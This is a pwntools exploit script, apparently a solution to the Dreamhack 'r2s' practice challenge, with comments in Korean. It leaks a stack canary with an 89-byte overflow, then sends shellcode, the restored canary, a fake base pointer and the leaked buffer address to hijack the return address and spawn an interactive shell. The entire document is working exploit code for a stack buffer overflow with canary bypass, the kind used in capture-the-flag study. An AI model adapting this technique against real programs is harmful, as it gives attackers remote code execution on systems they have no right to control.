from pwn import *

context.log_level = "debug"
context.arch = "amd64"

def start():
    if args.REMOTE:
        host="host3.dreamhack.games"
        port=10317
        return remote(host,port)
    else:
        return process("./r2s")
p=start()

p.recvuntil(b'Address of the buf: ')
buf_addr = int(p.recvline().strip(),16) #주소 앞뒤 문자 지우고 16진수로 저장

payload_1st = b'a'*89   #카나리 앞까지 패딩 +1 \x00생략
p.sendafter(b"Input: ",payload_1st)
p.recvuntil(payload_1st)
cnry = b'\x00'+p.recvn(7)   #카나리 값 리틀엔디안 바이트 저장

sh = asm(shellcraft.sh()) #어셈블리어 문자열을 바이트로 변경
payload_2nd = sh.ljust(88,b'a') #쉘코드와 패딩
payload_2nd += cnry #canary
payload_2nd += b'b'*8   #rbp
payload_2nd += p64(buf_addr) #rip

p.sendafter(b'Input: ',payload_2nd)
p.interactive()